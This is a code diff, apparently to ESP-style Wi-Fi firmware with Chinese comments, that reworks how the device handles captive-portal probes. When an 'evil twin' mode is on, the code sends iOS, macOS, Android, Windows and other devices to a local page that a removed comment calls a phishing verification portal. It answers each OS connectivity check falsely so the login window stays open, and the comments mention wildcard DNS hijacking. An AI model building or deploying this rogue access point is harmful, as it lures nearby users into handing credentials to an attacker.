@@ -5019,10 +5019,75 @@ static void onAdmin(const char *uri, HTTPMethod method, void (*fn)()) {
   });
 }
 
+// ===== Captive Portal 防弹窗拦截 — 深度适配 iOS / Android / Windows / macOS CNA 协议 =====
+// 核心原理: 各操作系统连接 Wi-Fi 后, 会向固定探测 URL 发送 HTTP 请求:
+//   - iOS/macOS: GET /hotspot-detect.html → 期望返回 <HTML><BODY>Success</BODY></HTML>
+//     如果返回的内容 ≠ "Success", 系统判定为受限网络, 弹出 CNA 全屏认证窗口。
+//     302 重定向也可触发 CNA, 但 iOS 16+ 在 302 后会二次验证: 如果 302 目标返回后
+//     再次请求探测 URL 仍收到非 "Success", CNA 会保持打开; 否则用户点 "完成" 后 CNA 关闭。
+//     → 策略: 直接 302 到门户页, 后续探测请求始终返回非 Success 内容, 保持 CNA 不关闭。
+//
+//   - Android: GET /generate_204 或 /gen_204 → 期望 HTTP 204 No Content
+//     如果收到非 204 (如 302), 系统显示"需要登录"通知; 点击后打开系统内置浏览器访问该页。
+//     Android 12+ 额外检查 /connectivitycheck/gstatic/xxx, 行为类似。
+//     ⚠️ 陷阱: 如果对 /generate_204 返回 204, Android 认为网络正常, 不弹任何提示!
+//     → 策略: 对 Android 探测路径返回 302 重定向 (非 204), 触发"需要登录"通知。
+//
+//   - Windows: GET /connecttest.txt → 期望返回内容 "Microsoft Connect Test"
+//     GET /redirect → 期望 302 跳转到 msftconnecttest.com
+//     如果 /connecttest.txt 返回的内容 ≠ 预期, 系统弹出 NCSI 登录窗口。
+//     → 策略: 对 /connecttest.txt 返回非预期内容, 触发 Windows NCSI 弹窗。
+//
+//   - Samsung: GET /generate_204 (同 Android) + 额外 GET /check_network
+//     → 策略: 统一到 Android 302 路径。
+//
+// 关键防拦截措施:
+//   1. 所有 CNA 探测路径返回"非预期"内容, 确保系统持续判定为"受限网络";
+//   2. 门户页内嵌 <meta http-equiv="refresh"> 自动跳转, 即使 CNA 未弹出也不会白屏;
+//   3. 苹果系 /hotspot-detect.html 用 302→portal (非直接返回 Success), 保持 CNA 窗口不自动关闭;
+//   4. DNS 通配劫持已在 setup() 中启动, 所有域名解析到 192.168.4.1。
+
+static const char *captiveTarget() {
+  return sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
+}
+
+// iOS/macOS CNA: 返回非 "Success" 的 HTML, 让系统持续判定为受限网络并保持 CNA 窗口打开
+// 同时在 body 内嵌 meta-refresh + JS 双保险跳转到门户页
+static void handleAppleCNA() {
+  const char *target = captiveTarget();
+  String html = "<!DOCTYPE html><html><head><meta charset='utf-8'>"
+    "<meta http-equiv='refresh' content='0;url=" + String(target) + "'>"
+    "<title>Login Required</title></head><body>"
+    "<script>window.location.replace('" + String(target) + "');</script>"
+    "<p>Redirecting... <a href='" + String(target) + "'>Click here</a></p>"
+    "</body></html>";
+  // 不缓存, 确保每次探测都重新请求本固件
+  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  server.sendHeader("Pragma", "no-cache");
+  server.sendHeader("Expires", "0");
+  server.send(200, "text/html; charset=utf-8", html);
+}
+
+// Android CNA: 返回 302 而非 204, 触发系统"需要登录 Wi-Fi"通知
+static void handleAndroidCNA() {
+  server.sendHeader("Location", captiveTarget());
+  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  server.send(302, "text/html", "");
+}
+
+// Windows NCSI: 对 /connecttest.txt 返回非 "Microsoft Connect Test" 的内容
+static void handleWindowsCNA() {
+  const char *target = captiveTarget();
+  // 返回 302 重定向到门户页, 触发 Windows 的 NCSI "需要操作"弹窗
+  server.sendHeader("Location", target);
+  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
+  server.send(302, "text/plain", "");
+}
+
+// 通用 302 重定向 (兼容其他未识别的 OS 探测)
 static void captiveRedirect(const char *type = "text/plain") {
-  // 当开启邪恶双子实验时，优先弹出钓鱼验证门户；否则弹出后台管理 (CNA 要求绝对 URI)
-  const char *loc = sEvilTwin.active ? "http://192.168.4.1/portal.html" : ADMIN_HTML_C;
-  server.sendHeader("Location", loc);
+  server.sendHeader("Location", captiveTarget());
+  server.sendHeader("Cache-Control", "no-cache, no-store, must-revalidate");
   server.send(302, type, "");
 }
 
@@ -5039,13 +5104,45 @@ static void notFound() {
     server.send(404, "text/plain", "404 — 未知 API: " + uri);
     return;
   }
+
+  // ---------- iOS / macOS (Apple CNA) ----------
+  // captive.apple.com/hotspot-detect.html, /library/test/success.html
+  // 以及 captive.apple.com/bag, /hotspot-detect.html (带各种 query 参数)
   if (uri == "/hotspot-detect.html" || uri == "/library/test/success.html" ||
-      uri == "/generate_204" || uri == "/gen_204" ||
-      uri == "/connecttest.txt" || uri == "/redirect" || uri == "/ncsi.txt" ||
-      uri == "/success.txt" || uri == "/fwlink" || uri == "/") {
+      uri.startsWith("/hotspot-detect")) {
+    handleAppleCNA();
+    return;
+  }
+
+  // ---------- Android / Samsung / HTC ----------
+  // clients3.google.com/generate_204, connectivitycheck.gstatic.com/generate_204
+  // connectivitycheck.android.com/generate_204, play.googleapis.com/generate_204
+  // 以及三星 /check_network, /generate_204_json
+  if (uri == "/generate_204" || uri == "/gen_204" ||
+      uri == "/check_network" || uri == "/generate_204_json" ||
+      uri.startsWith("/generate") || uri.startsWith("/connectivity")) {
+    handleAndroidCNA();
+    return;
+  }
+
+  // ---------- Windows (NCSI) ----------
+  // www.msftconnecttest.com/connecttest.txt, /redirect
+  // www.msftncsi.com/ncsi.txt
+  if (uri == "/connecttest.txt" || uri == "/ncsi.txt" ||
+      uri == "/redirect" || uri == "/fwlink" ||
+      uri.startsWith("/connecttest") || uri.startsWith("/ncsi")) {
+    handleWindowsCNA();
+    return;
+  }
+
+  // ---------- 其他 (Firefox /success.txt, Kindle /kindle-wifi, 等) ----------
+  if (uri == "/success.txt" || uri == "/kindle-wifi" || uri == "/wifi" ||
+      uri == "/canonical.html" || uri == "/chat" || uri == "/") {
     captiveRedirect();
     return;
   }
+
+  // 最终兜底: 未知路径也重定向到门户, 确保不泄露 404
   captiveRedirect();
 }
 
